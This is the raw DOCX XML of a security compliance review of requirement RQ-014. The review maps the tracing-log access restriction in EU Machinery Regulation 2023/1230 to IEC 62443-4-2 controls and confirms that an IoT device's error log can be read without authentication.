    <w:p w14:paraId="38686742" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0589F941" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="439FB81B" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DBCF885" w14:textId="77777777" w:rsidR="009E77F2" w:rsidRDefault="009E77F2" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6326879E" w14:textId="77777777" w:rsidR="00E57282" w:rsidRDefault="00E57282" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="589C75C6" w14:textId="3C3CE810" w:rsidR="00A366E1" w:rsidRPr="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00A366E1">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A366E1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>REQUIREMENT 14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEA3A6B" w14:textId="77777777" w:rsidR="00A366E1" w:rsidRPr="00A366E1" w:rsidRDefault="00A366E1" w:rsidP="00A366E1">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="796F95D6" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D43917" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">RQ-014 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access-restriction / confidentiality</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement on the tracing log — and it forms an elegant, and somewhat </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>paradoxical</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, closing pair with RQ-012/013. Those requirements demanded the log be </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retained</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; RQ-014 demands it be </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access-restricted</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exclusively</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> … to a competent national authority"). Your analysis is </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>correct and its "confirmed non-conformity" verdict is sound</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the IoT-Core error log is readable by anyone on the segment with no gate. My corrections are two: an </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>asset-label error</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that would break your traceability, and a </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sharpening of the paradox</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that is the single most powerful analytical point available for this requirement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109EF50F" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2C01CA" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="00F91F55" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Your text is EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §3 (final sentence)</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>purpose-limited access restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the tracing log. This is fundamentally an </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access-control + confidentiality + purpose-limitation</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement.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907"/>
        <w:gridCol w:w="1326"/>
        <w:gridCol w:w="4943"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="102B2D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4D64D8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CR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2290BB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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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171CBD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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict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B67174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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / Addition</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="4007A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E46F6" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">CR 2.1 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Authorization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enforcement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549A0" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17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063513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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> — and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>unmet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EEB5A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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">No authorization gate on log reads. Add </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.1(2)</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (role-mapping) to express the "</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>exclusively</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> competent-authority" purpose-limitation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="60152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8DF4C" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Protection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of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audit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information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B579A" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17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C857C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9DE61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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep — CR 3.9 covers </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>both</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> integrity (RQ-012) and </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>confidentiality/access</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> of the audit store.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="1CBBF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BE66C" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">CR 4.1 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Confidentiality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of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information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38935" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17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3BD80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t>Correct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9AC19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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep. Add </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 4.3</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — no HTTPS (SRIO-7907), so even if a gate existed, the channel is cleartext.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="420F52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610D5" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>accessibility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0BC1B" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17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D340D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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Correct but note the inversion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27AD7" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">This is the paradox: RQ-012/013 </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>require</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CR 6.1 accessibility; RQ-014 </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>requires it be restricted</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. The device implements </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unrestricted CR 6.1</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, which </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>satisfies RQ-012's readability</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> but </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>violates RQ-014's exclusivity</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">Frame </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>this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explicitly</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="279D1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4EA54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 xml:space="preserve">CR 1.1 / CR 1.2 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Identification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> &amp; Authentication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E8D07" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Missing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530B0" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Add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9C665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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">"Restrict access exclusively to [an authority]" </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>requires</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the reader to be </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>identified and authenticated</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> first. With device-side authentication </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>dropped</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-8299), there is </w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no identity to authorize against</w:t>
            </w:r>
            <w:r w:rsidRPr="00F91F55">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — so CR 2.1 cannot function because CR 1.1/1.2 are absent. This is the root cause, and your mapping omits it.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="509DC75A" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-014 → EHSR 1.1.9 §3 (access restriction) →</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">{CR 1.1/1.2 [I&amp;A — absent, root cause], CR 2.1(2) [authorization/purpose-limit — unmet], CR 3.9 [audit confidentiality — unmet], CR 4.1(+4.3) [confidentiality/cleartext — unmet], CR 6.1 [accessibility — implemented as </w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unrestricted</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, the inversion]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00F91F55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId338" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId339" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId340" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FF5B1F1" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1.2 Assets &amp; STRIDE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807"/>
        <w:gridCol w:w="5814"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="35138C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B85A1F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661C7E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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs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6007AF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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="158B6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F3938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lang w:val="en-US"/>
              </w:rPr>
              <w:t>Asset I – tracing log (to be access-restricted)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2EA57" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17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4F302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t>Correct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primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
